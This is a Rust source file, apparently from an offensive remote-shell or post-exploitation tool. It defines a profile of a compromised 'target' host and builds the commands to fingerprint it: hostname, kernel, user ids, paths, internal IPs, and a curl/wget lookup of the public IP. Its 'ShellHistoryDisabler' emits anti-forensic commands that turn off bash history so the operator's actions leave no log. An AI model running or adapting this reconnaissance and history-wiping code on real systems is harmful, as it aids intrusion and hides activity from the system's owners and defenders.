use serde::{Deserialize, Serialize};

pub const DEFAULT_TERM: &str = "xterm-256color";
pub const DEFAULT_SHELL: &str = "/bin/bash";

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TargetEnvironment {
    pub hostname: Option<String>,
    pub arch: Option<String>,
    pub distro: Option<String>,
    pub distro_version: Option<String>,
    pub kernel: Option<String>,
    pub shell: Option<String>,
    pub term: String,
    pub rows: u16,
    pub cols: u16,
    pub uid: Option<u32>,
    pub gid: Option<u32>,
    pub username: Option<String>,
    pub home: Option<String>,
    pub path: Option<String>,
    pub has_pty: bool,
    pub public_ip: Option<String>,
    pub internal_ip: Option<String>,
}

impl Default for TargetEnvironment {
    fn default() -> Self {
        TargetEnvironment {
            hostname: None,
            arch: None,
            distro: None,
            distro_version: None,
            kernel: None,
            shell: None,
            term: DEFAULT_TERM.into(),
            rows: 24,
            cols: 80,
            uid: None,
            gid: None,
            username: None,
            home: None,
            path: None,
            has_pty: false,
            public_ip: None,
            internal_ip: None,
        }
    }
}

impl TargetEnvironment {
    pub fn sync_command(&self) -> String {
        format!(
            "stty rows {} columns {} 2>/dev/null; export TERM='{}'",
            self.rows, self.cols, self.term
        )
    }

    pub fn discovery_commands(&self) -> Vec<&str> {
        vec![
            "hostname 2>/dev/null",
            "uname -m 2>/dev/null",
            "cat /etc/os-release 2>/dev/null | head -5",
            "uname -r 2>/dev/null",
            "id -u 2>/dev/null",
            "id -g 2>/dev/null",
            "id -un 2>/dev/null",
            "echo $HOME",
            "echo $PATH",
            "echo $SHELL",
            "ip addr show 2>/dev/null | grep 'inet ' | head -3",
            "curl -s ifconfig.me 2>/dev/null || wget -qO- ifconfig.me 2>/dev/null || echo 'no_ext_ip'",
        ]
    }
}

pub struct ShellHistoryDisabler;

impl ShellHistoryDisabler {
    pub fn disable_command() -> Vec<String> {
        vec![
            "export HISTFILE=/dev/null".into(),
            "unset HISTFILE".into(),
            "export HISTSIZE=0".into(),
            "export HISTFILESIZE=0".into(),
            "set +o history 2>/dev/null || true".into(),
            "echo APEX_HISTORY_DISABLED".into(),
        ]
    }

    pub fn combined_disable() -> String {
        Self::disable_command().join("; ")
    }
}
